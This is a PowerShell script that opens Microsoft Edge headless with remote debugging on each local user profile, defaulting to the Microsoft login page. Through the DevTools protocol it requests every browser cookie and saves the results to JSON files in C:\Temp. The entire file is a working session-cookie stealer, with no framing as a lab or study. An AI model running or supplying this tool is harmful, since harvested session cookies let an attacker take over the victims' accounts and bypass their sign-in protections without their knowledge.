param([int]$Port = 9222, [string]$EdgePath = 'msedge.exe', [string]$Url = "https://login.microsoftonline.com", [string]$UserDataDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data", [string]$OutDir = "C:\Temp", [bool]$Debug = $false)
$global:GET_ALL_COOKIES_REQUEST = New-Object PSObject -Property @{id = 1; method="Network.getAllCookies"} | ConvertTo-Json

Function WriteOutput {
    Param (
        [string]$OutputString,
        [bool]$Debug = $false,
        [bool]$NewLine = $true
    )

    If ($Debug) {
        If ($NewLine) { Write-Host $OutputString }
        Else { Write-Host $OutputString -NoNewLine }
    }
}

Function WSSendMessage {
    param (
        [Net.WebSockets.ClientWebSocket]$WS,
        [Threading.CancellationToken]$CT,
        [bool]$Debug = $false
    )

    Try {
        WriteOutput -OutputString "[i] Sending request..." -Debug $Debug -NewLine $false
        $Send = New-Object System.ArraySegment[byte] -ArgumentList @(,[System.Text.Encoding]::UTF8.GetBytes($global:GET_ALL_COOKIES_REQUEST))
        $Conn = $WS.SendAsync($Send, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CT)
        WriteOutput -OutputString " OK" -Debug $Debug
        $true
    } Catch {
        WriteOutput -OutputString " FAILED" -Debug $Debug
        $false
    }
}

Function WSRecvMessage {
    param (
        [Net.WebSockets.ClientWebSocket]$WS,
        [bool]$Debug = $false
    )

    Try {
        $recvQueue = New-Object 'System.Collections.Concurrent.ConcurrentQueue[String]'
        WriteOutput -OutputString "[i] Receiving response..." -Debug $Debug -NewLine $false
        $buffer = [Net.WebSockets.WebSocket]::CreateClientBuffer(1024,1024)
        $CT = [Threading.CancellationToken]::new($false)

        $jsonResult = ""
        Do {
            $taskResult = $WS.ReceiveAsync($buffer, $CT)
            While (-not $taskResult.IsCompleted -and $WS.State -eq [Net.WebSockets.WebSocketState]::Open) {
                [Threading.Thread]::Sleep(1)
            }
            $jsonResult += [Text.Encoding]::UTF8.GetString($buffer, 0, $taskResult.Result.Count)
        } Until ($WS.State -ne [Net.WebSockets.WebSocketState]::Open -or $taskResult.Result.EndOfMessage)

        If (-not [string]::IsNullOrEmpty($jsonResult)) {
            $recvQueue.Enqueue($jsonResult)
        }
        WriteOutput -OutputString " OK" -Debug $Debug
        return $jsonResult
    } Catch {
        WriteOutput -OutputString " FAILED" -Debug $Debug
        return $false
    }
}

Function WSConnection {
    param(
        [string]$WebSocketUrl,
        [bool]$Debug = $false
    )

    $WS = New-Object Net.WebSockets.ClientWebSocket
    $CT = New-Object Threading.CancellationToken
    $CTS = New-Object Threading.CancellationTokenSource
    $WS.Options.UseDefaultCredentials = $true

    Try{
        WriteOutput -OutputString "[i] Connecting..." -Debug $Debug -NewLine $false

        $Conn = $WS.ConnectAsync($WebSocketUrl, $CTS.Token)
        While (!$Conn.IsCompleted) {
            Start-Sleep -Milliseconds 100
        }

        WriteOutput -OutputString " OK" -Debug $Debug
        If (WSSendMessage -WS $WS -CT $CT -Debug $Debug -eq $true) {
            $jsonResult = WSRecvMessage -WS $WS -Debug $Debug
            return $jsonResult
        }
        Else {
            return $false
        }

    } Catch {
        WriteOutput -OutputString " FAILED" -Debug $Debug
        $false
    } Finally {
        If ($WS) {
            WriteOutput -OutputString "[i] Closing WebSocket..." -Debug $Debug -NewLine $false
            $WS.Dispose()
            WriteOutput -OutputString " OK" -Debug $Debug
        }
    }
}

Function SaveCookies {
    param(
        $Cookies,
        [string]$FilePath = ".\cookies.json",
        [bool]$Debug = $false
    )
    $Cookies = $Cookies | ConvertFrom-Json
    $Cookies = $Cookies.result.cookies
    $Cookies = $Cookies | ConvertTo-Json
    Out-File -FilePath $FilePath -InputObject $Cookies -Encoding ASCII
    WriteOutput -OutputString "[+] Cookies saved in $FilePath" -Debug $Debug
}

$profiles = "Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"
ForEach ($profile in $profiles) {
    # Run edge in headless mode
    If (Test-Path -Path "$UserDataDir\$profile") {
        $edgeProcess = Start-Process $EdgePath -ArgumentList "$Url",`"--user-data-dir=$UserDataDir`","--profile-directory=$profile","--remote-debugging-port=$Port","--headless" -PassThru

        Start-Sleep -Seconds 2

        # Retrieve the WebSocket URL from the Chromium Debugger listener
        $webSocketUrl = curl "http://localhost:$Port/json" -UseBasicParsing
        $webSocketUrl = $webSocketUrl.content | ConvertFrom-Json
        $webSocketUrl = $webSocketUrl[0].webSocketDebuggerUrl
        WriteOutput -OutputString "[i] Socket URL: $webSocketUrl" -Debug $Debug

        Start-Sleep -Seconds 2

        $result = WSConnection -WebSocketUrl $webSocketUrl -Debug $debug
        If ($result -ne $false) {
            If (-not (Test-Path -Path $OutDir)) { New-Item $OutDir -ItemType Directory > $null }
            SaveCookies -Cookies $result -FilePath "$OutDir\$profile.json" -Debug $Debug
        }

        Try {
            $process = taskkill /F /PID $edgeProcess.ID
            WriteOutput -OutputString "[i] $process" -Debug $Debug
        } Catch {
            WriteOutput -OutputString "[!] Process PID not found" -Debug $Debug
        }
    } Else {
        WriteOutput -OutputString "[i] $profile not found" -Debug $Debug
    }
}
